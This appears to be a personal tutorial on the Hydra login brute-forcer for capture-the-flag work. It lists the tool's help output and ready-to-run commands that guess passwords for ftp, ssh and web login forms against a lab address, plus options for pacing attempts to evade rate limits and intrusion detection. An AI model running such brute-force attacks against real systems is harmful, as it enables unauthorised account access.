# hydra

Hydra is a very powerful tool to brute force a system. I can provide it with a wordlist to try for the username or password in a login attempt. It will run the attempts in parrallel. Hydra is also aware of many different services and protocols. I can use this same tool to brute force ssh, ftp, PostgreSQL, smb and more. Some tools like community edition of Burp Suite rate limits my login attempts and so understanding how to use Hydra saves me from purchasing a Burp Suite license.

## Usage

```bash
$ hydra -h
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -I        ignore an existing restore file (don't wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
  -O        use old SSL v2 and v3
  -q        do not print messages about connection errors
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.
These services were not compiled in: afp ncp oracle sapr3.

Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

## Examples

The following examples are ones that I have used in capture the flag exercises. The wordlists that are provided are ones that are found on Kali unless otherwise specified.

For each of the examples below, here are the variables that I am using:

- Username of `bob`
- Password wordlist found in `/usr/share/wordlist/rockyou.txt`
- The target machine is found at ip address `10.10.1.1`

### ftp

There are a lot of companies and users that still use ftp servers. Unfortunately, these servers are not very secure and often have sensitive documents on them. Don't sleep on how valuable an ftp server can be.

The syntax is the following when not including options:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ftp
```

or

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt ftp://10.10.1.1
```

### ftps

Using ftps is better than ftp for security.

The syntax is the following when not including options:

`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ftps`

or

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt ftps://10.10.1.1
```

### http-get

When I go to a website that has basic HTTP authentication (a site that asks for a username and password in a javascript popup), hydra can brute force that site. I typically see these on admin sites running outside ports 80 or 443.

The syntax is the following when not including options:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 http-get
```

or

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get://10.10.1.1
```

### http-post-form

This is where I use hydra the most. In a capture the flag event, I have found a username and I need to loop over a list of passwords to log into the admin section of a website. I'll manually attempt to log into the site and get the error message for a failed login attempt. In this example, the failed message is "Invalid Login".

The syntax is the following when not including options:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid Login"
```

Most of the items on here are familiar. The last section where things are more complicated. The last section is split into 3 parts and are seperated by the ':' character. Here is a breakdown of each part:

- `/index.php` is the path to the form I am trying to post to.
- `username=^USER^&password=^PASS^` are where I pass in my username and password that were set with the -l and -P variables at the start of the command. In this case, `username` and `password` are variables of the form located at `/index.php`. They need to match the parameters of the form I am trying to brute force.
- `F=Invalid Login` is how I tell hydra what will be in the response when there is a failure. If a username and password succeed, "Invalid Login" will not be in the resposne.

### https-post-form

The previous section works for a site that is using http (port 80 by default). If the webserver is running https (port 443 by default), then a single character needs to be added to the above command. Instead of `http-post-form` the command will use `https-post-form`. So the previous command will become:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 https-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid Login"
```

Again, the `http-post-form` in the previous example became `https-post-form`.

### ssh

If a system is vulnerable to an ssh brute force (meaning if I type `ssh target_machine` and it asks for a password) and I have either a username or password, hydra can help you gain access.

The syntax is the following when not including options:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh
```

or

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh:10.10.1.1
```

Hydra will then use go through each of the entries in the wordlist and report if any of the entries worked. The output will look like the following when hydra finds the password:

`[22][ssh] host: 10.10.1.1    login: bob     password: 123456`

### Options

Because systems like Linux are so configurable, capture the flag events will configure services in many different ways so that I have to read the manual for the different tools I am using. Below are some options are useful to know about.

#### -h

The output provided above was generated with this option. This options always gives me the most up to date information about the hydra options I am using. The syntax is the following:

```bash
$ hydra -h
```

#### -s PORT

Sometimes a service is running on a different port. I use this option to let hydra know that the service isn't using the standard port for that service. For example, if ssh was running on port 9000 instead of the usual 22, I would run the following:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh -s 9000
```

#### -v and -vV

Sometimes I want to make sure things are running as I was intending them to run. Maybe I need a sanity check to make sure I got the syntax correct. The verbose options can help with that. The `-v` option will add output lines that start with `[VERBOSE]` or `[STATUS]`, making the output more verbose. The `-V` option will add output lines that start with `[ATTEMPT]` that show each attempt. When I want to use either one, the sytax is the following:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh -v
```

or

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh -V
```

I can also use them together using:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh -vV
```

#### -c TIME

Sometimes I know that I need to rate limit my login attempts due to a network intrusion detection system or perhaps the server I am brute forcing naturally rate limits my login attempts. In either case I can specify the wait time per login attempt. Each thread will use this option. Here is the syntax to wait 3 seconds between each attempt:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh -c 3
```

#### -t TASKS

If I am trying to brute force a single target, I can specify the maximum number of connections for that target. This can be really handy if my machine and the target have a lot of resources and can handle the load. By default, this number is 16. In this example I am going to double the connections. Here is the syntax I used to change it:

```bash
$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh -t 32
```
